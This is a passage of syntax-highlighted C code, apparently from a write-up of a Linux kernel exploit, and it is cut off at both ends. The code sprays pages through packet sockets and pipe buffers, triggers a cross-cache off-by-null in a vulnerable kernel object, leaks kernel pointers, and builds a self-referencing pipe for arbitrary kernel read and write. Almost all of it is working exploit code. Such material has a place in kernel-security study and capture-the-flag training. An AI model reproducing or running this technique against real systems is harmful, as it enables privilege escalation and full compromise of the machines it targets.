class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>&#125;;<br><br><span class="hljs-comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">int</span> cmd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr;<br>&#125;;<br><br><span class="hljs-comment">/* operations type */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    CMD_ALLOC_PAGE,<br>    CMD_FREE_PAGE,<br>    CMD_EXIT,<br>&#125;;<br><br><span class="hljs-comment">/* tpacket version for setsockopt */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span> &#123;</span><br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-comment">/* pipe for cmd communication */</span><br><span class="hljs-type">int</span> cmd_pipe_req[<span class="hljs-number">2</span>], cmd_pipe_reply[<span class="hljs-number">2</span>];<br><br><span class="hljs-comment">/* create a socket and alloc pages, return the socket fd */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_socket_and_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd, version;<br>    <span class="hljs-type">int</span> ret;<br><br>    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);<br>        ret = socket_fd;<br>        <span class="hljs-keyword">goto</span> err_out;<br>    &#125;<br><br>    version = TPACKET_V1;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                     &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = size;<br>    req.tp_block_nr = nr;<br>    req.tp_frame_size = <span class="hljs-number">0x1000</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> socket_fd;<br><br>err_setsockopt:<br>    close(socket_fd);<br>err_out:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the parent process should call it to send command of allocation to child */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_ALLOC_PAGE,<br>        .size = size,<br>        .nr = nr,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv_page_request));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the parent process should call it to send command of freeing to child */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">free_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_FREE_PAGE,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    usleep(<span class="hljs-number">10000</span>);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the child, handler for commands from the pipe */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_cmd_handler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd[PGV_PAGE_NUM];<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/* create an isolate namespace*/</span><br>    unshare_setup();<br><br>    <span class="hljs-comment">/* handler request */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        read(cmd_pipe_req[<span class="hljs-number">0</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br><br>        <span class="hljs-keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;<br>            ret = create_socket_and_alloc_pages(req.size, req.nr);<br>            socket_fd[req.idx] = ret;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;<br>            ret = close(socket_fd[req.idx]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);<br>        &#125;<br><br>        write(cmd_pipe_reply[<span class="hljs-number">1</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br>    &#125; <span class="hljs-keyword">while</span> (req.cmd != CMD_EXIT);<br>&#125;<br><br><span class="hljs-comment">/* init pgv-exploit subsystem :) */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pgv_system</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* pipe for pgv */</span><br>    pipe(cmd_pipe_req);<br>    pipe(cmd_pipe_reply);<br>    <br>    <span class="hljs-comment">/* child process for pages spray */</span><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        spray_cmd_handler();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * IV - config for page-level heap spray and heap fengshui</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NUM 200</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span><br><br><span class="hljs-type">int</span> pgv_1page_start_idx = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;<br><span class="hljs-type">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;<br><br><span class="hljs-comment">/* spray pages in different size for various usages */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pgv_pages</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * We want a more clear and continuous memory there, which require us to </span><br><span class="hljs-comment">     * make the noise less in allocating order-3 pages.</span><br><span class="hljs-comment">     * So we pre-allocate the pages for those noisy objects there.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-0 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (alloc_page(i, <span class="hljs-number">0x1000</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-2 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray 8 pages for page-level heap fengshui */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-3 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">19</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_4pages_start_idx++);<br>        &#125;<br><br>        <span class="hljs-comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">21</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_1page_start_idx += <span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">512</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_1page_start_idx += <span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* for pipe escalation */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRD_PIPE_BUF_SZ 192</span><br><br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> orig_pid = <span class="hljs-number">-1</span>, victim_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> snd_orig_pid = <span class="hljs-number">-1</span>, snd_vicitm_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> self_2nd_pipe_pid = <span class="hljs-number">-1</span>, self_3rd_pipe_pid = <span class="hljs-number">-1</span>, self_4th_pipe_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buf</span>;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">extend_pipe_buffer_to_4k</span><span class="hljs-params">(<span class="hljs-type">int</span> start_idx, <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nr; i++) &#123;<br>        <span class="hljs-comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_8pages_start_idx++);<br>        &#125;<br><br>        <span class="hljs-comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  V - FIRST exploit stage - cross-cache overflow to make page-level UAF</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;<br><br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] exetend pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (extend_pipe_buffer_to_4k(<span class="hljs-number">0</span>, PIPE_SPRAY_NUM / <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);<br>    free_page(pgv_8pages_start_idx++);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KCACHE_NUM; i++) &#123;<br>        kcache_alloc(i, <span class="hljs-number">8</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] exetend pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="hljs-number">2</span>, PIPE_SPRAY_NUM / <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating pipe pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);  <span class="hljs-comment">/* prevent pipe_release() */</span><br>    &#125;<br><br>    <span class="hljs-comment">/* try to trigger cross-cache overflow */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KCACHE_NUM; i++) &#123;<br>        kcache_append(i, KCACHE_SIZE - <span class="hljs-number">8</span>, buf);<br>    &#125;<br><br>    <span class="hljs-comment">/* checking for cross-cache overflow */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for corruption...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;<br>            orig_pid = nr;<br>            victim_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, <br>                   victim_pid, orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">24</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, <br>           info_pipe_buf.page, info_pipe_buf.ops);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span><br>        || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-comment">/* construct a second-level page uaf */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>    info_pipe_buf.page = (<span class="hljs-keyword">struct</span> page*) ((<span class="hljs-type">size_t</span>) info_pipe_buf.page + <span class="hljs-number">0x40</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        <span class="hljs-keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;<br>            snd_orig_pid = nr;<br>            snd_vicitm_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>                   snd_vicitm_pid, snd_orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (snd_vicitm_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">building_self_writing_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> trd_pipe_sz = <span class="hljs-number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buf</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page_ptr</span>;</span><br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="hljs-number">24</span> <span class="hljs-number">-3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free second-level original pipe...&quot;</span>);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* let a pipe-&gt;bufs pointing to itself */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.page = info_pipe_buf.page;<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.ops = info_pipe_buf.ops;<br>    evil_pipe_buf.flags = info_pipe_buf.flags;<br>    evil_pipe_buf.private = info_pipe_buf.private;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i 